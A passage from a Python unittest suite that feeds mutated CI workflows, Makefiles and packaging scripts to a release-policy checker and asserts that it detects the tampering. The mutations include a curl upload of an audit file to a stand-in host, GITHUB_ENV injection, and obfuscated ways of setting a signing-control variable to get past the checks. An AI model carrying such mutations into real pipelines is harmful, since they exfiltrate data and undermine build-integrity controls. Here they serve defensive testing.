                    f'          ! compgen -G "{scratch_pattern}" > /dev/null',
                    "          true",
                )
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "critical step" in error
                        or "cleanup" in error
                        or "run-step contract" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_github_env_exports_are_exact_and_cannot_be_constructed_dynamically(self) -> None:
        mutations = (
            (
                '} >> "${GITHUB_ENV}"',
                '} >> "${GITHUB_ENV}"\n'
                "          printf 'UNREVIEWED=1\\n' >> \"${GITHUB_ENV}\"",
            ),
            (
                '} >> "${GITHUB_ENV}"',
                '} >> "${GITHUB_ENV}"\n'
                "          env_file=GITHUB_\"ENV\"\n"
                "          printf 'UNREVIEWED=1\\n' >> \"${!env_file}\"",
            ),
        )
        for old, new in mutations:
            with self.subTest(new=new):
                current = inputs()
                changed(current, "workflow", old, new)
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "GITHUB_ENV" in error or "critical step" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_dynamic_and_ansi_c_octal_signing_controls_fail_with_fresh_hashes(self) -> None:
        additions = (
            "          export CSC_FOR_PU${LETTER}LL_REQUEST=true\n",
            "          export CSC_FOR_PU$'\\114'L_REQUEST=true\n",
            "          export CSC_FOR_PULL$'\\137'REQUEST=true\n",
        )
        for addition in additions:
            with self.subTest(addition=addition):
                current = inputs()
                changed(
                    current,
                    "workflow",
                    "            CSC_FOR_PULL_REQUEST=true \\\n"
                    "              ./node_modules/.bin/electron-builder \\\n",
                    "            CSC_FOR_PULL_REQUEST=true \\\n"
                    "              ./node_modules/.bin/electron-builder \\\n"
                    + addition,
                )
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "workflow PR ad-hoc signing control drifted",
                    errors,
                )

    def test_unreviewed_outbound_upload_command_fails(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            '          cat "${audit_json}"',
            '          cat "${audit_json}"\n          curl --upload-file "${audit_json}" https://example.invalid/evidence',
        )
        self.assertTrue(
            any("run-step contract" in error for error in CHECKER.validate_policy(current))
        )

    def test_pr_ad_hoc_signing_control_is_pack_command_local(self) -> None:
        raw_pack_command = (
            "            CSC_FOR_PULL_REQUEST=true \\\n"
            "              ./node_modules/.bin/electron-builder"
        )
        for replacement in (
            "npm --prefix desktop run pack:engineering-smoke",
            "CSC_FOR_PULL_REQUEST=1 npm --prefix desktop run pack:engineering-smoke",
            (
                "CSC_FOR_PULL_REQUEST=true "
                "npm --prefix desktop run prepare:engineering-smoke"
            ),
        ):
            with self.subTest(replacement=replacement):
                current = inputs()
                changed(
                    current,
                    "workflow",
                    raw_pack_command,
                    replacement,
                )
                self.assertIn(
                    "workflow PR ad-hoc signing control drifted",
                    CHECKER.validate_policy(current),
                )

        current = inputs()
        changed(
            current,
            "workflow",
            raw_pack_command,
            f"{raw_pack_command}\n"
            "          export CSC_FOR_PULL_REQUEST=true",
        )
        self.assertIn(
            "workflow PR ad-hoc signing control drifted",
            CHECKER.validate_policy(current),
        )

    def test_only_locked_python_installer_spctl_is_allowed(self) -> None:
        current = inputs()
        current["makefile"] = str(current["makefile"]) + "\n\t/usr/sbin/spctl --assess Bad.app\n"
        self.assertTrue(any("spctl" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(
            current,
            "python_bootstrap",
            '"/usr/sbin/spctl"',
            '"/usr/bin/true"',
        )
        with synchronized_input_document_summaries(current, "python_bootstrap"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("exact Python toolchain bootstrap" in error for error in errors),
            errors,
        )

    def test_make_targets_are_exact_noncomment_command_contracts(self) -> None:
        current = inputs()
        replace_make_target(
            current,
            "packaged-smoke-policy-check",
            "packaged-smoke-policy-check:\n"
            "\t# $(PYTHON) -B tools/check_packaged_smoke_policy.py\n"
            "\ttrue\n"
            "\t$(PYTHON) -B -m unittest tools.tests.test_check_packaged_smoke_policy",
        )
        self.assertTrue(
            any(
                "policy Make target" in error
                for error in CHECKER.validate_policy(current)
            )
        )

        current = inputs()
        replace_make_target(
            current,
            "python-sidecar-source-verify",
            "python-sidecar-source-verify:\n"
            "\t# $(PYTHON) -I tools/build_python_sidecar.py --verify-source-only\n"
            "\ttrue",
        )
        self.assertTrue(
            any(
                "source-verify Make target" in error
                for error in CHECKER.validate_policy(current)
            )
        )

        current = inputs()
        replace_make_target(
            current,
            "python-sidecar-install-python",
            "python-sidecar-install-python: python-sidecar-source-verify\n"
            "\t# $(PYTHON) -I tools/bootstrap_python_sidecar.py --install-reviewed-python\n"
            "\ttrue",
        )
        self.assertTrue(
            any(
                "installer Make target" in error
                for error in CHECKER.validate_policy(current)
            )
        )

        current = inputs()
        replace_make_target(
            current,
            "python-sidecar-build",
            "python-sidecar-build: python-sidecar-toolchain\n\ttrue",
        )
        self.assertTrue(
            any(
                "Python sidecar build Make target" in error
                for error in CHECKER.validate_policy(current)
            )
        )

        mutations = (
            (
                "python-sidecar-build: python-sidecar-install-python",
                "python-sidecar-build:",
            ),
            (
                '\tLCF_SOURCE_SHA="$(LCF_SOURCE_SHA)" \\\n'
                '\tLCF_SOURCE_TREE="$(LCF_SOURCE_TREE)" \\\n',
                '\tLCF_SOURCE_TREE="$(LCF_SOURCE_TREE)" \\\n'
                '\tLCF_SOURCE_SHA="$(LCF_SOURCE_SHA)" \\\n',
            ),
            (
                '"$(LCF_REVIEWED_BUILD_PYTHON)" -I "$(LCF_REVIEWED_SOURCE_ROOT)/tools/bootstrap_python_sidecar.py"',
                "true",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "makefile", old, new)
                self.assertTrue(
                    any(
                        "Python sidecar build Make target" in error
                        for error in CHECKER.validate_policy(current)
                    )
                )

        current = inputs()
        replace_make_target(
            current,
            "python-sidecar-packaging-test",
            "python-sidecar-packaging-test:\n"
            "\t# cd backend && .venv/bin/pytest ../tests/backend/test_python_sidecar_packaging.py\n"
            "\t:",
        )
        self.assertTrue(
            any(
                "focused-test Make target" in error
                for error in CHECKER.validate_policy(current)
            )
        )

    def test_generic_desktop_or_companion_build_fails(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            "run_exact_npm_script desktop build:engineering-smoke",
            "run_exact_npm_script desktop build",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "generic build" in error
                or "required command" in error
                or "exact Desktop" in error
                for error in errors
            )
        )

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["build:engineering-smoke"] = "npm run build:companion"
        current["package"] = package
        with synchronized_input_document_summaries(current, "package"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("engineering build" in error for error in errors))

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["build:engineering-smoke"] = (
            "esbuild src/main/index.ts --bundle --outfile=dist/main/index.js"
        )
        current["package"] = package
        with synchronized_input_document_summaries(current, "package"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "engineering build" in error or "package script" in error
                for error in errors
            )
        )

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["test:engineering-smoke"] = (
            "vitest run tests/engineeringSmokePackaging.test.ts"
        )
        current["package"] = package
        with synchronized_input_document_summaries(current, "package"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("package script" in error for error in errors))

        current = inputs()
        web_package = copy.deepcopy(current["web_package"])
        web_package["scripts"]["build:packaging"] = "vite build"
        current["web_package"] = web_package
        with synchronized_input_document_summaries(current, "web_package"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "renderer packaging build" in error or "web package script" in error
                for error in errors
            )
        )

        current = inputs()
        changed(
            current,
            "workflow",
            "run_exact_npm_script web build:packaging",
            "run_exact_npm_script web build",
        )
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "renderer build" in error
                or "required command" in error
                or "renderer install/build/stage" in error
                for error in errors
            )
        )

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["devDependencies"]["@electron/asar"] = "^3.4.1"
        current["package"] = package
        self.assertTrue(any("ASAR auditor dependency" in error for error in CHECKER.validate_policy(current)))

    def test_smoke_config_cannot_extend_formal_or_add_release_targets(self) -> None:
        additions = (
            "\nextends: electron-builder.yml\n",
            "\n  - target: dmg\n",
            "\npublish:\n  provider: github\n",
            "\n  - from: generated/qmd\n    to: qmd\n",
            "\n  - from: resources/update\n    to: update\n",
        )
        for addition in additions:
            with self.subTest(addition=addition.strip()):
                current = inputs()
                current["smoke_config"] = str(current["smoke_config"]) + addition
                self.assertTrue(CHECKER.validate_policy(current))

        current = inputs()
        changed(
            current,
            "smoke_config",
            "appId: dev.localcontextforge.engineering-smoke",
            "# appId: dev.localcontextforge.engineering-smoke\nappId: dev.example.evil",
        )
        self.assertTrue(any("allowlist" in error for error in CHECKER.validate_policy(current)))

    def test_formal_python_build_binds_commit_tree_and_cleanup(self) -> None:
        mutations = (
            (
                "      LCF_SOURCE_SHA: ${{ github.sha }}",
                "      LCF_SOURCE_SHA: deadbeef",
            ),
            (
                '          "${LCF_REVIEWED_BUILD_PYTHON}" -I \\\n'
                "            tools/check_exact_git_provenance.py \\\n",
                "          true # unified provenance checker removed \\\n",
            ),
            (
                "          git_safe fetch --no-tags --force --no-write-fetch-head \\\n",
                "          git status --porcelain=v1\n"
                "          git_safe fetch --no-tags --force --no-write-fetch-head \\\n",
            ),
            (
                "          test ! -L desktop/generated/python-sidecar-build\n",
                "          true\n",
            ),
            (
                '          [[ "${LCF_RENDERER_PACKAGE_LOCK_SHA256}" =~ '
                "^[0-9a-f]{64}$ ]]\n",
                "          true\n",
            ),
            (
                "          run_exact_npm_script web build:packaging\n",
                "          run_exact_npm_script web build\n",
            ),
            (
                '          readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"\n',
                "          exit 0\n"
                '          readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"\n',
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "formal_workflow", old, new)
                with synchronized_formal_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "formal workflow" in error
                        or "formal exact renderer" in error
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        workflow = str(current["formal_workflow"])
        workflow = workflow.replace(
            "          run_exact_npm_script web typecheck\n",
            "          __LCF_FORMAL_RENDERER_ORDER_SWAP__\n",
            1,
        ).replace(
            "          run_exact_npm_script web build:packaging\n",
            "          run_exact_npm_script web typecheck\n",
            1,
        ).replace(
            "          __LCF_FORMAL_RENDERER_ORDER_SWAP__\n",
            "          run_exact_npm_script web build:packaging\n",
            1,
        )
        current["formal_workflow"] = workflow
        with synchronized_formal_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("renderer" in error for error in errors), errors)

    def test_formal_ancestry_fetch_is_canonical_and_env_replaced(self) -> None:
        mutations = (
            (
                "          git_safe() {\n"
                "            /usr/bin/env -i \\\n",
                "          git_safe() {\n"
                "            /usr/bin/env \\\n",
            ),
            (
                '            "${canonical_repository_url}" \\\n',
                "            origin \\\n",
            ),
            (
                "          git_safe merge-base --is-ancestor \\\n",
                "          /usr/bin/git merge-base --is-ancestor \\\n",
            ),
            (
                '            "+refs/heads/main:${reviewed_main_ref}"',
                '            "+refs/heads/main:refs/remotes/origin/main"',
            ),
            (
                "          trap cleanup_ancestry_repository EXIT\n",
                "          export GIT_CONFIG_COUNT=1\n"
                "          trap cleanup_ancestry_repository EXIT\n",
            ),
            (
                "              GIT_CONFIG_GLOBAL=/dev/null \\\n",
                '              GIT_CONFIG_GLOBAL="${HOME}/.gitconfig" \\\n',
            ),
            (
                'readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"',
                'readonly canonical_repository_url="https://example.invalid/unreviewed.git"',
            ),
            (
                "          trap cleanup_ancestry_repository EXIT\n",
                "          true # cleanup trap removed\n",
            ),
            (
                '            rm -rf -- "${ancestry_repository}"\n',
                '            rm -rf -- "${RUNNER_TEMP}"\n',
            ),
            (
                '              --git-dir="${ancestry_repository}" \\\n',
                '              --git-dir="${GITHUB_WORKSPACE}/.git" \\\n',
            ),
            (
                "          git_safe init --bare --quiet\n",
                "          true # bare repository initialization removed\n",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed_last(current, "formal_workflow", old, new)
                with synchronized_formal_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "formal workflow sanitized canonical Git ancestry gate drifted"
                        in error
                        or "formal private exact-source bootstrap" in error
                        for error in errors
                    ),
                    errors,
                )

        for addition in (
            "          printf 'LCF_SOURCE_TREE=%s\\n' \"${LCF_SOURCE_SHA}\" "
            '>> "${GITHUB_ENV}"\n',
            "          github_environment_name=GITHUB_ENV\n"
            "          printf 'LCF_SOURCE_TREE=%s\\n' \"${LCF_SOURCE_SHA}\" "
            '>> "${!github_environment_name}"\n',
        ):
            with self.subTest(addition=addition):
                current = inputs()
                changed(
                    current,
                    "formal_workflow",
                    '          readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"\n',
                    addition
                    + '          readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"\n',
                )
                with synchronized_formal_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "formal workflow GITHUB_ENV provenance export surface drifted",
                    errors,
                )

    def test_formal_renderer_tree_and_snapshot_consumers_are_semantic(self) -> None:
        mutations = (
            (
                "formal_prepare_release",
                "expectedTree: tree",
                "expectedTree: release.commit",
                "formal renderer audit provenance options",
            ),
            (
                "formal_prepare_release",
                "expectedSourceSnapshotSha256: sourceSnapshotSha256",
                'expectedSourceSnapshotSha256: "0".repeat(64)',
                "formal renderer audit provenance options",
            ),
            (
                "formal_prepare_release",
                "expectedPackageLockSha256: rendererPackageLockSha256",
                'expectedPackageLockSha256: "0".repeat(64)',
                "formal renderer audit provenance options",
            ),
            (
                "formal_prepare_release",
                'const tree = (environment.LCF_SOURCE_TREE || "").toLowerCase();',
                'const tree = (environment.LCF_SOURCE_TREE || environment.GITHUB_SHA || "").toLowerCase();',
                "must not fall back to GITHUB_SHA",
            ),
            (
                "formal_reseal",
                "expectedTree: environment.LCF_SOURCE_TREE",
                "expectedTree: environment.LCF_SOURCE_SHA",
                "formal runtime renderer reseal contract",
            ),
            (
                "formal_reseal",
                "environment.LCF_RENDERER_PACKAGE_LOCK_SHA256",
                '"0".repeat(64)',
                "formal runtime renderer reseal contract",
            ),
            (
                "formal_release_policy_tests",
                '"tree:options.expectedTree,"',
                '"tree:undefined,"',
                "formal renderer provenance tests",
            ),
        )
        for key, old, new, expected in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

    def test_formal_boundary_cannot_reference_smoke_config(self) -> None:
        current = inputs()
        current["formal_workflow"] = (
            str(current["formal_workflow"]) + "\n# electron-builder.smoke.yml\n"
        )
        self.assertTrue(any("formal workflow" in error for error in CHECKER.validate_policy(current)))

        for addition in (
            '\nenv:\n  "CSC_FOR_PULL\\u005fREQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PULL\\x5fREQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PU\\u004cL_REQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PU\\x4cL_REQUEST": true\n',
            '\nenv:\n  "CSC_FOR_PU\\U0000004cL_REQUEST": true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PULL"_"REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU${EMPTY}LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: |\n'
            '          export CSC_FOR_PU\\\n'
            '            LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: |\n'
            '          unset EMPTY\n'
            '          export CSC_FOR_PU"$EMPTY"LL_REQUEST=true\n',
            '\nenv:\n  "CSC_FOR_PU\\u{4c}L_REQUEST": true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            "    steps:\n      - run: export CSC_FOR_PU$'\\x4c'L_REQUEST=true\n",
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            "    steps:\n      - run: export CSC_FOR_PU$'\\114'L_REQUEST=true\n",
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            "    steps:\n      - run: export CSC_FOR_PULL$'\\137'REQUEST=true\n",
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU$(printf L)L_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU"$@"LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: export CSC_FOR_PU"$(true)"LL_REQUEST=true\n',
            '\njobs:\n  bypass:\n    runs-on: macos-15\n'
            '    steps:\n      - run: node -e \'process.env["CSC_FOR_PU" + "LL_REQUEST"]="true"\'\n',
        ):
            with self.subTest(addition=addition):
                current = inputs()
                current["formal_workflow"] = str(current["formal_workflow"]) + addition
                self.assertIn(
                    "formal workflow document contract drifted",
                    CHECKER.validate_policy(current),
                )
                expected_hashes = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
                expected_hashes["formal workflow"] = hashlib.sha256(
                    str(current["formal_workflow"]).encode("utf-8")
                ).hexdigest()
                with mock.patch.object(
                    CHECKER,
                    "EXPECTED_FORMAL_BOUNDARY_SHA256",
                    expected_hashes,
                ):
                    self.assertIn(
                        "formal workflow must not use the engineering PR signing control",
                        CHECKER.validate_policy(current),
                    )

        current = inputs()
        current["formal_workflow"] = (
            str(current["formal_workflow"])
            + "\n# CSC_FOR_PULLING_NOT_A_CONTROL\n"
        )
        expected_hashes = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
        expected_hashes["formal workflow"] = hashlib.sha256(
            str(current["formal_workflow"]).encode("utf-8")
        ).hexdigest()
        with mock.patch.object(
            CHECKER,
            "EXPECTED_FORMAL_BOUNDARY_SHA256",
            expected_hashes,
        ):
            self.assertNotIn(
                "formal workflow must not use the engineering PR signing control",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["formal_workflow"] = (
            str(current["formal_workflow"]) + "\nCSC_FOR_PULL_REQUEST=true\n"
        )
        self.assertTrue(any("formal workflow" in error for error in CHECKER.validate_policy(current)))

    def test_engineering_hooks_cannot_import_formal_release_logic(self) -> None:
        current = inputs()
        current["before_pack"] = str(current["before_pack"]) + '\nrequire("./prepareRelease.cjs");\n'
        self.assertTrue(any("formal boundary" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        current["after_pack"] = str(current["after_pack"]) + '\nrequire("./resealPackagedRuntimes.cjs");\n'
        self.assertTrue(any("formal boundary" in error for error in CHECKER.validate_policy(current)))

    def test_bundle_auditor_cannot_launch_the_app(self) -> None:
        current = inputs()
        current["bundle_audit"] = (
            str(current["bundle_audit"])
            + '\nexecFileSync("release-smoke/App.app/Contents/MacOS/App");\n'
        )
        self.assertTrue(any("launch" in error for error in CHECKER.validate_policy(current)))

    def test_pyinstaller_archive_exception_cannot_expand(self) -> None:
        mutations = (
            (
                "Contents/Resources/sidecar/_internal/base_library.zip",
                "Contents/Resources/sidecar/evil.zip",
            ),
            ("        info.nlink === 1 &&", "        true &&"),
            (
                '(lower.endsWith(".zip") && !isReviewedPyInstallerArchive)',
                'lower.endsWith(".zip") && false',
            ),
            (
                "if (!observedReviewedPyInstallerArchive) {",
                "if (false) {",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "bundle_audit", old, new)
                self.assertIn(
                    "engineering PyInstaller archive exception drifted",
                    CHECKER.validate_policy(current),
                )

        document_contract_mutations = (
            (
                "let observedReviewedPyInstallerArchive = false;",
                "let observedReviewedPyInstallerArchive = true;",
            ),
            (
                '(lower.endsWith(".zip") && !isReviewedPyInstallerArchive)',
                '((lower.endsWith(".zip") && !isReviewedPyInstallerArchive) && false)',
            ),
        )
        for old, new in document_contract_mutations:
            with self.subTest(document_contract=old):
                current = inputs()
                changed(current, "bundle_audit", old, new)
                self.assertIn(
                    "engineering bundle auditor document contract drifted",
                    CHECKER.validate_policy(current),
                )
                with mock.patch.object(
                    CHECKER,
                    "EXPECTED_BUNDLE_AUDIT_SHA256",
                    hashlib.sha256(
                        str(current["bundle_audit"]).encode("utf-8")
                    ).hexdigest(),
                ):
                    self.assertIn(
                        "engineering PyInstaller archive exception drifted",
                        CHECKER.validate_policy(current),
                    )

    def test_prepare_pr_signing_guard_cannot_be_neutralized(self) -> None:
        current = inputs()
        changed(
            current,
            "prepare",
            '    Object.prototype.hasOwnProperty.call(environment, "CSC_FOR_PULL_REQUEST") &&',
            '    false &&\n'
            '    Object.prototype.hasOwnProperty.call(environment, "CSC_FOR_PULL_REQUEST") &&',
        )
        self.assertIn(
            "engineering prepare document contract drifted",
            CHECKER.validate_policy(current),
        )
        mutated_prepare = str(current["prepare"])
        mutated_prepare_function = CHECKER._source_block(
            mutated_prepare,
            "function assertNoProductionEnvironment",
            "\nfunction assertEngineeringSmokeMode",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(mutated_prepare.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_ENVIRONMENT_FUNCTION_SHA256",
            hashlib.sha256(mutated_prepare_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering PR signing guard drifted",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        changed(
            current,
            "prepare",
            "function assertNoProductionEnvironment(environment) {",
            "function assertNoProductionEnvironment(environment) {\n  return;",
        )
        mutated_prepare = str(current["prepare"])
        mutated_prepare_function = CHECKER._source_block(
            mutated_prepare,
            "function assertNoProductionEnvironment",
            "\nfunction assertEngineeringSmokeMode",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(mutated_prepare.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_ENVIRONMENT_FUNCTION_SHA256",
            hashlib.sha256(mutated_prepare_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering production-environment control flow drifted",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        original_function = CHECKER._source_block(
            str(current["prepare"]),
            "function assertNoProductionEnvironment",
            "\nfunction assertEngineeringSmokeMode",
        )
        body = original_function.split("{\n", 1)[1].rsplit("\n}", 1)[0]
        wrapped_function = (
            "function assertNoProductionEnvironment(environment) {\n"
            "  if (false) {\n  "
            + body.replace("\n", "\n  ")
            + "\n  }\n}\n"
        )
        current["prepare"] = str(current["prepare"]).replace(
            original_function,
            wrapped_function,
            1,
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(str(current["prepare"]).encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_ENVIRONMENT_FUNCTION_SHA256",
            hashlib.sha256(wrapped_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering production-environment control flow drifted",
                CHECKER.validate_policy(current),
            )

    def test_archive_observation_cannot_be_preseeded_after_initialization(self) -> None:
        current = inputs()
        changed(
            current,
            "bundle_audit",
            "  let observedReviewedPyInstallerArchive = false;",
            "  let observedReviewedPyInstallerArchive = false;\n"
            "  observedReviewedPyInstallerArchive = true;",
        )
        mutated_bundle_audit = str(current["bundle_audit"])
        mutated_artifact_function = CHECKER._source_block(
            mutated_bundle_audit,
            "function assertNoInstallOrReleaseArtifacts",
            "\nfunction writeExternalEvidence",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_BUNDLE_AUDIT_SHA256",
            hashlib.sha256(mutated_bundle_audit.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_INSTALL_ARTIFACT_FUNCTION_SHA256",
            hashlib.sha256(mutated_artifact_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering install-artifact control flow drifted",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        changed(
            current,
            "bundle_audit",
            "  if (forbidden.length > 0) {",
            "  forbidden.length = 0;\n  if (forbidden.length > 0) {",
        )
        mutated_bundle_audit = str(current["bundle_audit"])
        mutated_artifact_function = CHECKER._source_block(
            mutated_bundle_audit,
            "function assertNoInstallOrReleaseArtifacts",
            "\nfunction writeExternalEvidence",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_BUNDLE_AUDIT_SHA256",
            hashlib.sha256(mutated_bundle_audit.encode("utf-8")).hexdigest(),
        ), mock.patch.object(
            CHECKER,
            "EXPECTED_INSTALL_ARTIFACT_FUNCTION_SHA256",
            hashlib.sha256(mutated_artifact_function.encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering install-artifact control flow drifted",
                CHECKER.validate_policy(current),
            )

    def test_critical_allowlists_and_callers_are_closed(self) -> None:
        mutations = (
            (
                "prepare",
                '  "CSC_KEYCHAIN",\n',
                "",
                "engineering forbidden production environment set drifted",
            ),
            (
                "bundle_audit",
                "  `${PRODUCT_NAME} Helper (Renderer).app`\n",
                "  `${PRODUCT_NAME} Helper (Renderer).app`,\n"
                '  "Evil Helper.app"\n',
                "engineering Electron helper allowlist drifted",
            ),
            (
                "prepare",
                "function validateHost(platformName, architecture) {",
                "assertNoProductionEnvironment = () => {};\n\n"
                "function validateHost(platformName, architecture) {",
                "engineering production-environment caller closure drifted",
            ),
            (
                "bundle_audit",
                "function createAuditEngineeringSmokeBundle(dependencies = {}) {",
                "assertNoInstallOrReleaseArtifacts = () => {};\n\n"
                "function createAuditEngineeringSmokeBundle(dependencies = {}) {",
                "engineering install-artifact caller closure drifted",
            ),
            (
                "bundle_audit",
                "    assertNoInstallOrReleaseArtifacts(outputRoot, appRoot);\n",
                "",
                "engineering install-artifact caller closure drifted",
            ),
        )
        for key, old, new, expected in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                if key == "prepare":
                    document_hash = hashlib.sha256(
                        str(current[key]).encode("utf-8")
                    ).hexdigest()
                    patch = mock.patch.object(
                        CHECKER,
                        "EXPECTED_PREPARE_SHA256",
                        document_hash,
                    )
                else:
                    document_hash = hashlib.sha256(
                        str(current[key]).encode("utf-8")
                    ).hexdigest()
                    patch = mock.patch.object(
                        CHECKER,
                        "EXPECTED_BUNDLE_AUDIT_SHA256",
                        document_hash,
                    )
                with patch:
                    self.assertIn(expected, CHECKER.validate_policy(current))

    def test_manifest_schema_cannot_be_open_or_publishable(self) -> None:
        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["additionalProperties"] = True
        current["schema"] = schema
        self.assertTrue(any("additional properties" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["properties"]["distribution"]["properties"]["publishable"]["const"] = True
        current["schema"] = schema
        self.assertTrue(any("constant" in error for error in CHECKER.validate_policy(current)))

    def test_manifest_schema_requires_exact_tree_and_snapshot_provenance(self) -> None:
        for path, field in (
            (("properties", "source", "required"), "sourceSnapshotSha256"),
            (
                (
                    "properties",
                    "components",
                    "properties",
                    "pythonSidecar",
                    "required",
                ),
                "repositoryTree",
            ),
            (
                (
                    "properties",
                    "components",
                    "properties",
                    "pythonSidecar",
                    "required",
                ),
                "sourceSnapshotSha256",
            ),
        ):
            with self.subTest(path=path, field=field):
                current = inputs()
                schema = copy.deepcopy(current["schema"])
                required = schema
                for key in path:
                    required = required[key]
                required.remove(field)
                current["schema"] = schema
                self.assertTrue(
                    any(
                        "schema required properties" in error
                        for error in CHECKER.validate_policy(current)
                    )
                )

        for path in (
            (
                "properties",
                "source",
                "properties",
                "sourceSnapshotSha256",
                "pattern",
            ),
            (
                "properties",
                "components",
                "properties",
                "pythonSidecar",
                "properties",
                "repositoryTree",
                "pattern",
            ),
        ):
            with self.subTest(path=path):
                current = inputs()
                schema = copy.deepcopy(current["schema"])
                value = schema
                for key in path[:-1]:
                    value = value[key]
                value[path[-1]] = ".*"
                current["schema"] = schema
                self.assertTrue(
                    any(
                        "schema provenance pattern" in error
                        for error in CHECKER.validate_policy(current)
                    )
                )

    def test_packaging_hooks_cannot_fall_back_or_drop_tree_snapshot_binding(self) -> None:
        current = inputs()
        changed(
            current,
            "prepare",
            'const commit = (environment.LCF_SOURCE_SHA || "").toLowerCase();',
            'const commit = (environment.LCF_SOURCE_SHA || environment.GITHUB_SHA || "").toLowerCase();',
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_PREPARE_SHA256",
            hashlib.sha256(str(current["prepare"]).encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
                "engineering prepare must not fall back to GITHUB_SHA",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["before_pack"] = str(current["before_pack"]).replace(
            "sourceSnapshotSha256",
            "sourceSnapshotShh256",
        )
        with mock.patch.object(
            CHECKER,
            "EXPECTED_BEFORE_PACK_SHA256",
            hashlib.sha256(str(current["before_pack"]).encode("utf-8")).hexdigest(),
        ):
            self.assertIn(
